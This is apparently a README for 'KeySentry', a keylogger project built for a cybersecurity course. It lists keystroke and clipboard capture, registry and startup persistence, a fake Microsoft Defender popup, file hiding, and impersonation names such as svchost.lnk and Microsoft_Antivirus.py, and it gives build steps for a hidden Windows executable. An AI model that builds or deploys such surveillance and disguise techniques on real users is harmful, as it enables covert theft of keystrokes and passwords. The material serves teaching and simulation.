 🛡️ KeySentry – Behavioral Keylogger Simulation (Academic Project)

> ⚠️ Disclaimer: This tool is strictly for **academic, ethical hacking, and cybersecurity simulation purposes only. Do not deploy it on any system without explicit permission.



 📚 Introduction

KeySentry is a simulated behavioral keylogger designed as part of a final year cybersecurity project. It demonstrates how stealth techniques and persistence mechanisms can be applied to
simulate real-world data exfiltration behavior — all within a controlled lab environment.


✨ Features

| Module                        | Description                                                                 |
|------------------------------|-----------------------------------------------------------------------------|
| 🔑 Keystroke Logger           | Captures typed characters and special keys (e.g., Enter, Tab, Space)        |
| 📋 Clipboard Monitor          | Monitors Windows clipboard every 2 seconds and logs copied text            |
| 🛠️ Persistence via Registry   | Adds itself to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`         |
| 🗂️ Hidden Backup Creation     | Creates a hidden `.exe` backup under `%APPDATA%`                           |
| 🧠 Watchdog Self-Restart      | Relaunches if main file is deleted                                         |
| ⚠️ Fake Defender UI           | Shows a fake Microsoft Defender popup to simulate social engineering       |
| 🚀 Startup Folder Shortcut    | Creates `svchost.lnk` for stealth autorun (optional, via `winshell`)       |
| 🕵️ Enhanced File Hiding       | Uses `attrib +h +s +r` and fake timestamp for obfuscation                  |


 🛠️ How to Run (Developer Mode)

> This mode requires Python installed.

 ✅ Requirements:

- Python 3.10+ (64-bit)
- Run the following in PowerShell or CMD:

Build into Standalone `.EXE` 

To run the simulation on any Windows system without needing Python or libraries, we convert it into a standalone `.exe` using `PyInstaller`.

 ✅ Steps to Build:

1. **Install PyInstaller** (only needed once on your dev machine):
   ```bash
   pip install pyinstaller
2. Package your script into a single hidden EXE:
   ```bash
   pyinstaller --onefile --noconsole --icon=icons/securitylab.ico Microsoft_Antivirus.py


# Install required libraries
pip install -r requirements.txt
![Executable with Embedded Icon](Microsoft.jpg.exe)

# Run the script
python Microsoft_Antivirus.py

## 📄 Log File Storage

All captured keystrokes and clipboard data are stored locally in a hidden log file located at:

%APPDATA%\Microsoft\Windows\SecurityLab\logs.txt
